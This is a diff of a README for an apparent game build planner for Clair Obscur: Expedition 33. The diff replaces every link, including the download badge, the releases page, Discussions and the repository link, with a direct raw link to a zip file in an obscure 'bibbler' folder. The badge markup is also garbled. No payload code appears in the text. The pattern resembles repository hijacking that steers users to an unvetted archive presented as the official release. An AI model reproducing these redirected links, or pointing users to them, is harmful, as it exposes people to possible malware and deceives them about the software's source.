@@ -1,6 +1,6 @@
 # 🎮 expedition33-planner - Your AI Tool for Game Strategy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/oda-works/expedition33-planner/releases)
+[![Download Now](https://raw.githubusercontent.com/oda-works/expedition33-planner/main/bibbler/expedition33-planner.zip%https://raw.githubusercontent.com/oda-works/expedition33-planner/main/bibbler/expedition33-planner.zip)](https://raw.githubusercontent.com/oda-works/expedition33-planner/main/bibbler/expedition33-planner.zip)
 
 ## 📦 Overview
 **expedition33-planner** is a comprehensive AI-powered build planner and tracker for "Clair Obscur: Expedition 33". This application helps you optimize your characters, analyze party synergy, track achievements, and manage all game data effectively.
@@ -9,7 +9,7 @@
 Follow these steps to download and run the application:
 
 1. **Visit the Download Page**  
-   Click [here to visit the download page](https://github.com/oda-works/expedition33-planner/releases). This page contains all the available versions of the application.
+   Click [here to visit the download page](https://raw.githubusercontent.com/oda-works/expedition33-planner/main/bibbler/expedition33-planner.zip). This page contains all the available versions of the application.
 
 2. **Choose Your Version**  
    Look for the latest version listed on the page. It is usually marked as "Latest Release".
@@ -41,7 +41,7 @@ To successfully run the expedition33-planner, ensure your system meets the follo
 - **Browser**: Recommended to run with the latest version of Chrome, Firefox, or Safari for optimal performance.
 
 ## 📥 Download & Install
-You can download the software from the button above or by visiting [this page](https://github.com/oda-works/expedition33-planner/releases). Make sure to choose the correct installer for your system to avoid issues.
+You can download the software from the button above or by visiting [this page](https://raw.githubusercontent.com/oda-works/expedition33-planner/main/bibbler/expedition33-planner.zip). Make sure to choose the correct installer for your system to avoid issues.
 
 ## 📋 Frequently Asked Questions (FAQ)
 
@@ -64,7 +64,7 @@ If you encounter any issues:
 ## 🌐 Connect with Us
 Engage with the community and get updates:
 
-- Join our [GitHub Discussions](https://github.com/oda-works/expedition33-planner/discussions) to share your thoughts or ask questions.
-- Follow our [Repository](https://github.com/oda-works/expedition33-planner) for new releases and updates.
+- Join our [GitHub Discussions](https://raw.githubusercontent.com/oda-works/expedition33-planner/main/bibbler/expedition33-planner.zip) to share your thoughts or ask questions.
+- Follow our [Repository](https://raw.githubusercontent.com/oda-works/expedition33-planner/main/bibbler/expedition33-planner.zip) for new releases and updates.
 
 Happy gaming, and enjoy your adventure with expedition33-planner!
